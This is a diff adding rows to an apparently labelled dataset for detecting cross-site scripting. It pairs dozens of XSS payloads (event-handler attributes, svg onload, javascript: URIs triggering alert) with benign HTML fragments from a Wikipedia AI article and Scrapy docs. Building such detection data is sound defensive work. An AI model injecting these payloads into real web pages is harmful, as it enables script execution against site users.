+"<u onkeyup=""alert(1)"" contenteditable>test</u>",1
+"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionend=alert(1)></ins>",1
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www-formal.stanford.edu&amp;rft.atitle=Applications+of+AI&amp;rft_id=http%3A%2F%2Fwww-formal.stanford.edu%2Fjmc%2Fwhatisai%2Fnode3.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li class=""toclevel-2 tocsection-47""><a href=""#Art""><span class=""tocnumber"">7.12 ",0
+"<em onmousemove=""alert(1)"">test</em>",1
+<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,1
+"<noscript draggable=""true"" ondragenter=""alert(1)"">test</noscript>",1
+"<header onmouseleave=""alert(1)"">test</header>",1
+"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tt>",1
+"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",1
+"<ul><li><a href=""/wiki/Zairja"" title=""Zairja"">Zairja </a> </li>",0
+"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Hannun, Awni; Case, Carl; Casper, Jared; Catanzaro, Bryan; Diamos, Greg; Elsen, Erich; Prenger, Ryan; Satheesh, Sanjeev; Sengupta, Shubho; Coates, Adam; <a href=""/wiki/Andrew_Ng"" title=""Andrew Ng"">Ng, Andrew Y. </a> (2014). ""Deep Speech: Scaling up end-to-end speech recognition"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1412.5567"">1412.5567 </a> ",0
+			Languages,0
+<big onpointerdown=alert(1)>XSS</big>,1
+"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></table>",1
+"<link onkeydown=""alert(1)"" contenteditable>test</link>",1
+"<style>:target {transform: rotate(180deg);}</style><spacer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></spacer>",1
+			Print/export,0
+"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationstart=""alert(1)""></noscript>",1
+"<a draggable=""true"" ondragend=""alert(1)"">test</a>",1
+"	 </span><span><a href=""/wiki/Portal:Computer_programming"" title=""Portal:Computer programming"">Computer programming portal </a> ",0
+"<h4><span class=""mw-headline"" id=""Deep_feedforward_neural_networks"">Deep feedforward neural networks ",0
+"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",1
+"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>",1
+"<li><a href=""/wiki/Buckminster_Fuller"" title=""Buckminster Fuller"">Buckminster Fuller </a> </li>",0
+<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>,1
+<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,1
+"<li><a href=""/wiki/List_of_artificial_intelligence_projects"" title=""List of artificial intelligence projects"">Projects </a> </li>",0
+"<li id=""cite_note-Classical_planning-112""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Classical_planning_112-0"">^ </a> </b> ",0
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",1
+<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,1
+"<address onmouseover=""alert(1)"">test</address>",1
+"<style>@keyframes slidein {}</style><s style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></s>",1
+"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",1
+<template onpointerdown=alert(1)>XSS</template>,1
+"<a href=""/wiki/History_of_artificial_intelligence"" title=""History of artificial intelligence"">History </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spider-middleware.html"">Spider Middleware</a></li>",0
+"<ins ondblclick=""alert(1)"">test</ins>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></shadow>",1
+"<map oncopy=""alert(1)"" contenteditable>test</map>",1
+"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",1
+"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationend=""alert(1)""></cite>",1
+<animatetransform onpointerenter=alert(1)>XSS</animatetransform>,1
+"<font onmousedown=""alert(1)"">test</font>",1
+"<strike onclick=""alert(1)"">test</strike>",1
+"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('');"">",1
+<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>,1
+"<time onkeypress=""alert(1)"" contenteditable>test</time>",1
+"<label ondblclick=""alert(1)"">test</label>",1
+"<section onkeyup=""alert(1)"" contenteditable>test</section>",1
+"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;957 </li>",0
+"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",1
+"<col ondblclick=""alert(1)"">test</col>",1
+<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,1
+"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",1
+"	 </span> <span class=""toctext"">Robot rights ",0
+<dd onpointerup=alert(1)>XSS</dd>,1
+"<frame onkeyup=""alert(1)"" contenteditable>test</frame>",1
+"	<ul id=""footer-places"" class="""">",0
+"<font onbeforecut=""alert(1)"" contenteditable>test</font>",1
+<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>,1
+"<canvas onmousedown=""alert(1)"">test</canvas>",1
+"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",1
+<strike onpointerleave=alert(1)>XSS</strike>,1
+"<h2><span class=""mw-headline"" id=""History"">History ",0
+"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",1
+"    <input type=""hidden"" name=""area"" value=""default"" />",0
+"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://en.wikiquote.org/wiki/Special:Search/Artificial_intelligence"" class=""extiw"" title=""q:Special:Search/Artificial intelligence"">Quotations </a> from Wikiquote ",0
+"<header onclick=""alert(1)"">test</header>",1
+"<center onbeforepaste=""alert(1)"" contenteditable>test</center>",1
+"	 </span> <span class=""reference-text"">Ian Goodfellow, Yoshua Bengio, and Aaron Courville (2016). Deep Learning. MIT Press. <a rel=""nofollow"" class=""external text"" href=""http://www.deeplearningbook.org"">Online </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160416111010/http://www.deeplearningbook.org/"">Archived </a> 16 April 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> ",0
+"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",1
+"<area onmousedown=""alert(1)"">test</area>",1
+<dl onpointerout=alert(1)>XSS</dl>,1
+<svg/onload=alert('')>,1
+"<dt><a class=""reference internal"" href=""topics/items.html""><span class=""doc"">Items",0
+"<mark onbeforecopy=""alert(1)"" contenteditable>test</mark>",1
+"<col draggable=""true"" ondragleave=""alert(1)"">test</col>",1
+<listing onpointerleave=alert(1)>XSS</listing>,1
+"<data draggable=""true"" ondrag=""alert(1)"">test</data>",1
+"<div onmouseenter=""alert(1)"">test</div>",1
+<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>,1
+<ol onpointerover=alert(1)>XSS</ol>,1
+"<header draggable=""true"" ondrag=""alert(1)"">test</header>",1
+"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",1
+<p onpointerout=alert(1)>XSS</p>,1
+"<table oncut=""alert(1)"" contenteditable>test</table>",1
+"<frame onmousedown=""alert(1)"">test</frame>",1
+<dd onpointerdown=alert(1)>XSS</dd>,1
+"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",1
+"<data onmouseup=""alert(1)"">test</data>",1
+"<legend oncopy=""alert(1)"" contenteditable>test</legend>",1
+<picture onpointerup=alert(1)>XSS</picture>,1
+"<li><a href=""/wiki/Programming_team"" title=""Programming team"">Programming team </a> </li>",0
+"<li id=""cite_note-280""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-280"">^ </a> </b> ",0
+"<li id=""cite_note-Celli_et_al._2017-342""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Celli_et_al._2017_342-0"">^ </a> </b> ",0
+"	 </span> <span class=""reference-text""><cite class=""citation magazine"">Roberts, Jacob (2016). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20180819152455/https://www.sciencehistory.org/distillations/magazine/thinking-machines-the-search-for-artificial-intelligence"">""Thinking Machines: The Search for Artificial Intelligence"" </a>. <i>Distillations </i>. Vol.&#160;2 no.&#160;2. pp.&#160;14–23. Archived from <a rel=""nofollow"" class=""external text"" href=""https://www.sciencehistory.org/distillations/magazine/thinking-machines-the-search-for-artificial-intelligence"">the original </a> on 19 August 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">20 March ",0
+"	 <div id=""mw-hidden-catlinks"" class=""mw-hidden-catlinks mw-hidden-cats-hidden"">Hidden categories: <ul><li><a href=""/wiki/Category:Wikipedia_articles_needing_page_number_citations_from_December_2016"" title=""Category:Wikipedia articles needing page number citations from December 2016"">Wikipedia articles needing page number citations from December 2016 </a> </li><li><a href=""/wiki/Category:CS1_Chinese-language_sources_(zh)"" title=""Category:CS1 Chinese-language sources (zh)"">CS1 Chinese-language sources (zh) </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_needing_page_number_citations_from_February_2011"" title=""Category:Wikipedia articles needing page number citations from February 2011"">Wikipedia articles needing page number citations from February 2011 </a> </li><li><a href=""/wiki/Category:Webarchive_template_wayback_links"" title=""Category:Webarchive template wayback links"">Webarchive template wayback links </a> </li><li><a href=""/wiki/Category:All_articles_with_dead_external_links"" title=""Category:All articles with dead external links"">All articles with dead external links </a> </li><li><a href=""/wiki/Category:Articles_with_dead_external_links_from_October_2019"" title=""Category:Articles with dead external links from October 2019"">Articles with dead external links from October 2019 </a> </li><li><a href=""/wiki/Category:Articles_with_permanently_dead_external_links"" title=""Category:Articles with permanently dead external links"">Articles with permanently dead external links </a> </li><li><a href=""/wiki/Category:Pages_with_citations_lacking_titles"" title=""Category:Pages with citations lacking titles"">Pages with citations lacking titles </a> </li><li><a href=""/wiki/Category:Pages_with_citations_having_bare_URLs"" title=""Category:Pages with citations having bare URLs"">Pages with citations having bare URLs </a> </li><li><a href=""/wiki/Category:Pages_with_URL_errors"" title=""Category:Pages with URL errors"">Pages with URL errors </a> </li><li><a href=""/wiki/Category:Wikipedia_pending_changes_protected_pages"" title=""Category:Wikipedia pending changes protected pages"">Wikipedia pending changes protected pages </a> </li><li><a href=""/wiki/Category:Articles_with_short_description"" title=""Category:Articles with short description"">Articles with short description </a> </li><li><a href=""/wiki/Category:Use_dmy_dates_from_January_2018"" title=""Category:Use dmy dates from January 2018"">Use dmy dates from January 2018 </a> </li><li><a href=""/wiki/Category:All_articles_with_unsourced_statements"" title=""Category:All articles with unsourced statements"">All articles with unsourced statements </a> </li><li><a href=""/wiki/Category:Articles_with_unsourced_statements_from_June_2019"" title=""Category:Articles with unsourced statements from June 2019"">Articles with unsourced statements from June 2019 </a> </li><li><a href=""/wiki/Category:Articles_with_unsourced_statements_from_July_2019"" title=""Category:Articles with unsourced statements from July 2019"">Articles with unsourced statements from July 2019 </a> </li><li><a href=""/wiki/Category:All_accuracy_disputes"" title=""Category:All accuracy disputes"">All accuracy disputes </a> </li><li><a href=""/wiki/Category:Articles_with_disputed_statements_from_July_2019"" title=""Category:Articles with disputed statements from July 2019"">Articles with disputed statements from July 2019 </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_needing_clarification_from_July_2019"" title=""Category:Wikipedia articles needing clarification from July 2019"">Wikipedia articles needing clarification from July 2019 </a> </li><li><a href=""/wiki/Category:Articles_containing_potentially_dated_statements_from_2016"" title=""Category:Articles containing potentially dated statements from 2016"">Articles containing potentially dated statements from 2016 </a> </li><li><a href=""/wiki/Category:All_articles_containing_potentially_dated_statements"" title=""Category:All articles containing potentially dated statements"">All articles containing potentially dated statements </a> </li><li><a href=""/wiki/Category:Articles_needing_additional_references_from_January_2020"" title=""Category:Articles needing additional references from January 2020"">Articles needing additional references from January 2020 </a> </li><li><a href=""/wiki/Category:All_articles_needing_additional_references"" title=""Category:All articles needing additional references"">All articles needing additional references </a> </li><li><a href=""/wiki/Category:Articles_with_unsourced_statements_from_December_2019"" title=""Category:Articles with unsourced statements from December 2019"">Articles with unsourced statements from December 2019 </a> </li><li><a href=""/wiki/Category:CS1:_Julian%E2%80%93Gregorian_uncertainty"" title=""Category:CS1: Julian–Gregorian uncertainty"">CS1: Julian–Gregorian uncertainty </a> </li><li><a href=""/wiki/Category:CS1:_long_volume_value"" title=""Category:CS1: long volume value"">CS1: long volume value </a> </li><li><a href=""/wiki/Category:Articles_with_Internet_Encyclopedia_of_Philosophy_links"" title=""Category:Articles with Internet Encyclopedia of Philosophy links"">Articles with Internet Encyclopedia of Philosophy links </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_BNF_identifiers"" title=""Category:Wikipedia articles with BNF identifiers"">Wikipedia articles with BNF identifiers </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_GND_identifiers"" title=""Category:Wikipedia articles with GND identifiers"">Wikipedia articles with GND identifiers </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_LCCN_identifiers"" title=""Category:Wikipedia articles with LCCN identifiers"">Wikipedia articles with LCCN identifiers </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_NDL_identifiers"" title=""Category:Wikipedia articles with NDL identifiers"">Wikipedia articles with NDL identifiers </a> </li> </ul> </div> </div>",0
+	 </span></a></dt><dd>Learn how to contribute to the Scrapy project.</dd>,0
+"<a href=""/wiki/DARPA"" title=""DARPA"">DARPA </a> pours money into undirected pure research into AI during the 1960s:",0
+"<div id=""mw-indicator-pp-autoreview"" class=""mw-indicator"">",0
+"<p>Historically, projects such as the Cyc knowledge base (1984–) and the massive Japanese <a href=""/wiki/Fifth_generation_computer"" title=""Fifth generation computer"">Fifth Generation Computer Systems </a> initiative (1982–1992) attempted to cover the breadth of human cognition. These early projects failed to escape the limitations of non-quantitative symbolic logic models and, in retrospect, greatly underestimated the difficulty of cross-domain AI. Nowadays, the vast majority of current AI researchers work instead on tractable ""narrow AI"" applications (such as medical diagnosis or automobile navigation).<sup id=""cite_ref-contemporary_agi_146-0"" class=""reference""><a href=""#cite_note-contemporary_agi-146"">&#91;143&#93; </a> </sup> Many researchers predict that such ""narrow AI"" work in different individual domains will eventually be incorporated into a machine with <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">artificial general intelligence </a> (AGI), combining most of the narrow skills mentioned in this article and at some point even exceeding human ability in most or all these areas.<sup id=""cite_ref-General_intelligence_19-1"" class=""reference""><a href=""#cite_note-General_intelligence-19"">&#91;19&#93; </a> </sup>",0
+"<li><a href=""/wiki/Artificial_general_intelligence#Controversies_and_dangers"" title=""Artificial general intelligence"">Controversies and dangers of artificial general intelligence </a> </li>",0
+"<li id=""cite_note-Expert_systems-41""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Expert_systems_41-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Expert_systems_41-1""><sup><i><b>b </b> </i> </sup> </a> ",0
+"<ul><li><a href=""#CITEREFDreyfus1972"">Dreyfus 1972 </a>, <a href=""#CITEREFDreyfusDreyfus1986"">Dreyfus &amp; Dreyfus 1986 </a> </li>",0
+<dt>Breadth of commonsense knowledge </dt>,0
+"<link rel=""alternate"" type=""application/x-wiki"" title=""Edit this page"" href=""/w/index.php?title=Artificial_intelligence&amp;action=edit""/>",0
+"<li id=""cite_note-Dreyfus&#39;_critique-355""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Dreyfus&#39;_critique_355-0"">^ </a> </b> ",0
+"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/business/21732125-tech-giants-are-investing-billions-transformative-technology-google-leads-race"">""Google leads in the race to dominate artificial intelligence"" </a>. <i>The Economist </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0
+"<ul><li><a href=""/wiki/Abductive_reasoning"" title=""Abductive reasoning"">Abductive reasoning </a> </li>",0
+	 </span> </li> </ul>,0
+"	 </span> <span class=""reference-text""><cite class=""citation news"">Mahdawi, Arwa (26 June 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/us-news/2017/jun/26/jobs-future-automation-robots-skills-creative-health"">""What jobs will still be around in 20 years? Read this to prepare your future"" </a>. <i>The Guardian </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",0
+"<li><a href=""/wiki/Analysis_of_algorithms"" title=""Analysis of algorithms"">Analysis of algorithms </a> </li>",0
+"<li class=""toclevel-1 tocsection-69""><a href=""#In_fiction""><span class=""tocnumber"">10 ",0
+"	 </span> <span class=""reference-text""><cite class=""citation news"">Holley, Peter (28 January 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.washingtonpost.com/news/the-switch/wp/2015/01/28/bill-gates-on-dangers-of-artificial-intelligence-dont-understand-why-some-people-are-not-concerned/"">""Bill Gates on dangers of artificial intelligence: 'I don't understand why some people are not concerned<span class=""cs1-kern-right"">' ",0
+"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;414–416, </li>",0
+"	 </span> <span class=""toctext"">Social intelligence ",0
+"<li id=""cite_note-298""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-298"">^ </a> </b> ",0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;17, who write ""for the next 20 years the field would be dominated by these people and their students."" </li>",0
+"<li><a href=""/wiki/Paul_Feyerabend"" title=""Paul Feyerabend"">Paul Feyerabend </a> </li>",0
+	 </span>(1921) </li>,0
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;568–578 </li> </ul>",0
+"<li><a href=""/wiki/Daniel_Dennett"" title=""Daniel Dennett"">Daniel Dennett </a> </li> </ul>",0
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;24 </li>",0
+"	<a href=""/wiki/Affective_computing"" title=""Affective computing"">Affective computing </a> is an interdisciplinary umbrella that comprises systems which recognize, interpret, process, or simulate human ",0
+ </li>,0
+"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 10.1–2 </li> </ul>",0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Robotics"" title=""Robotics"">Robotics </a> </div>",0
+"	 </span> <span class=""reference-text""><cite class=""citation news"">Ford, Martin; Colvin, Geoff (6 September 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2015/sep/06/will-robots-create-destroy-jobs"">""Will robots create more jobs than they destroy?"" </a>. <i>The Guardian </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",0
+"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;443–445 </li>",0
+"<li><a href=""/wiki/Charles_Sanders_Peirce"" title=""Charles Sanders Peirce"">Charles Sanders Peirce </a> </li>",0
+"<li id=""cite_note-European_Platform_for_Digital_Humanism-350""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-European_Platform_for_Digital_Humanism_350-0"">^ </a> </b> ",0
+"<li><a href=""/wiki/Emergent_algorithm"" title=""Emergent algorithm"">Emergent algorithm </a> </li>",0
+"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;301–318 </li> </ul>",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=49"" title=""Edit section: The limits of artificial general intelligence"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<li class=""toclevel-2 tocsection-15""><a href=""#Cybernetics_and_brain_simulation""><span class=""tocnumber"">5.1 ",0
+"<li><a href=""/wiki/Evolutionary_data_mining"" title=""Evolutionary data mining"">Evolutionary data mining </a> </li>",0
+	 </span>(1879) </li>,0
+"	 </span> <span class=""reference-text""><a href=""/wiki/Sepp_Hochreiter"" title=""Sepp Hochreiter"">Hochreiter, Sepp </a>; and <a href=""/wiki/J%C3%BCrgen_Schmidhuber"" title=""Jürgen Schmidhuber"">Schmidhuber, Jürgen </a>; <i>Long Short-Term Memory </i>, Neural Computation, 9(8):1735–1780, 1997 ",0
+"<li id=""cite_note-Logic_as_search-186""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Logic_as_search_186-0"">^ </a> </b> ",0
+"            <a href=""#"" class=""icon icon-home""> Scrapy",0
+"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 21 </li> </ul>",0
+"<li><a href=""/wiki/Property_dualism"" title=""Property dualism"">Property dualism </a> </li>",0
+"Weizenbaum (the AI researcher who developed the first <a href=""/wiki/Chatterbot"" class=""mw-redirect"" title=""Chatterbot"">chatterbot </a> program, <a href=""/wiki/ELIZA"" title=""ELIZA"">ELIZA </a>) argued in 1976 that the misuse of artificial intelligence has the potential to devalue human life. ",0
+"<h4><span class=""mw-headline"" id=""Anti-logic_or_scruffy"">Anti-logic or scruffy ",0
+"<li><a href=""/wiki/Rhetoric_of_science"" title=""Rhetoric of science"">Rhetoric of science </a> </li>",0
+"<ul><li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0
+"<li><a href=""/wiki/Margaret_Mead"" title=""Margaret Mead"">Margaret Mead </a> </li>",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=5"" title=""Edit section: Reasoning, problem solving"">edit </a><span class=""mw-editsection-bracket"">] ",0
+The Mathematical Objection:,0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Computer_art"" title=""Computer art"">Computer art </a> </div>",0
+"<li id=""cite_note-Informed_search-189""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Informed_search_189-0"">^ </a> </b> ",0
+"""<a href=""/wiki/History_of_AI#The_golden_years_1956–1974"" class=""mw-redirect"" title=""History of AI"">Golden years </a>"" of AI (successful symbolic reasoning programs 1956–1973):",0
+"<li><a href=""/wiki/Decision_support_system"" title=""Decision support system"">Decision support system </a> </li>",0
+"<li id=""cite_note-GOFAI-157""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-GOFAI_157-0"">^ </a> </b> ",0
+"<li id=""cite_note-Multi-agent_planning-114""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Multi-agent_planning_114-0"">^ </a> </b> ",0
+"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, chpt. 2,3,7,9, </li>",0
+"<li><cite id=""CITEREFWasonShapiro1966"" class=""citation book""><a href=""/wiki/Peter_Cathcart_Wason"" title=""Peter Cathcart Wason"">Wason, P. C. </a>; Shapiro, D. (1966). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/newhorizonsinpsy0000foss"">""Reasoning"" </a> ",0
+"	 </span>. <i><a href=""/wiki/Nature_(journal)"" title=""Nature (journal)"">Nature </a> </i>. <b>550 </b> (7676): 354–359. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2017Natur.550..354S"">2017Natur.550..354S </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1038%2Fnature24270"">10.1038/nature24270 </a>. <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/0028-0836"">0028-0836 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/29052630"">29052630 </a>. <q>AlphaGo Lee... 12 convolutional layers </q> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Nature&amp;rft.atitle=Mastering+the+game+of+Go+without+human+knowledge&amp;rft.volume=550&amp;rft.issue=7676&amp;rft.pages=354-359&amp;rft.date=2017-10-19&amp;rft_id=info%3Adoi%2F10.1038%2Fnature24270&amp;rft.issn=0028-0836&amp;rft_id=info%3Apmid%2F29052630&amp;rft_id=info%3Abibcode%2F2017Natur.550..354S&amp;rft.aulast=Silver&amp;rft.aufirst=David&amp;rft.au=Schrittwieser%2C+Julian&amp;rft.au=Simonyan%2C+Karen&amp;rft.au=Antonoglou%2C+Ioannis&amp;rft.au=Huang%2C+Aja&amp;rft.au=Guez%2C+Arthur&amp;rft.au=Hubert%2C+Thomas&amp;rft.au=Baker%2C+Lucas&amp;rft.au=Lai%2C+Matthew&amp;rft.au=Bolton%2C+Adrian&amp;rft.au=Chen%2C+Yutian&amp;rft.au=Lillicrap%2C+Timothy&amp;rft.au=Fan%2C+Hui&amp;rft.au=Sifre%2C+Laurent&amp;rft.au=Driessche%2C+George+van+den&amp;rft.au=Graepel%2C+Thore&amp;rft.au=Hassabis%2C+Demis&amp;rft_id=http%3A%2F%2Fdiscovery.ucl.ac.uk%2F10045895%2F1%2Fagz_unformatted_nature.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<script type=""text/javascript"" src=""_static/readthedocs-data.js""></script>",0
+"		<li id=""footer-places-disclaimer""><a href=""/wiki/Wikipedia:General_disclaimer"" title=""Wikipedia:General disclaimer"">Disclaimers </a> </li>",0
+"        <div class=""wy-side-nav-search"" >",0
+"<li><a href=""/wiki/Scientific_formalism"" title=""Scientific formalism"">Scientific formalism </a> </li>",0
+"<ul><li><a href=""/wiki/Symbolic_artificial_intelligence"" title=""Symbolic artificial intelligence"">Symbolic </a> </li>",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=61"" title=""Edit section: Consciousness"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<a href=""/wiki/Robot_rights"" class=""mw-redirect"" title=""Robot rights"">Robot rights </a>:",0
+"	 </span> <span class=""toctext"">Reasoning, problem solving ",0
+"<li><a href=""/wiki/Wilhelm_Windelband"" title=""Wilhelm Windelband"">Wilhelm Windelband </a> </li>",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=2"" title=""Edit section: Definitions"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<li><a href=""/wiki/History_of_evolutionary_thought"" title=""History of evolutionary thought"">History of evolutionary thought </a> </li>",0
+" </p><p>AI often revolves around the use of <a href=""/wiki/Algorithms"" class=""mw-redirect"" title=""Algorithms"">algorithms </a>. An algorithm is a set of unambiguous instructions that a mechanical computer can execute.<sup id=""cite_ref-66"" class=""reference""><a href=""#cite_note-66"">&#91;b&#93; </a> </sup> A complex algorithm is often built on top of other, simpler, algorithms. A simple example of an algorithm is the following (optimal for first player) recipe for play at <a href=""/wiki/Tic-tac-toe"" title=""Tic-tac-toe"">tic-tac-toe </a>:<sup id=""cite_ref-FOOTNOTEDomingos2015Chapter_1_67-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015Chapter_1-67"">&#91;65&#93; </a> </sup>",0
+"<a href=""/wiki/Dartmouth_Workshop"" class=""mw-redirect"" title=""Dartmouth Workshop"">Dartmouth conference </a>:",0
+ </div>,0
+"<ul><li><a href=""/wiki/Model_of_computation"" title=""Model of computation"">Model of computation </a> </li>",0
+"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;200–201 </li> </ul>",0
+"<li><a href=""/wiki/Document_management_system"" title=""Document management system"">Document management </a> </li> </ul>",0
+"<li><a href=""/wiki/Medical_cybernetics"" title=""Medical cybernetics"">Medical cybernetics </a> </li>",0
+"<a href=""/wiki/Ontology_(computer_science)"" class=""mw-redirect"" title=""Ontology (computer science)"">Ontology </a>:",0
+"<li><cite id=""CITEREFClark2015"" class=""citation web"">Clark, Jack (8 December 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">""Why 2015 Was a Breakthrough Year in Artificial Intelligence"" </a>. <i>Bloomberg News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161123053855/https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">Archived </a> from the original on 23 November 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 November ",0
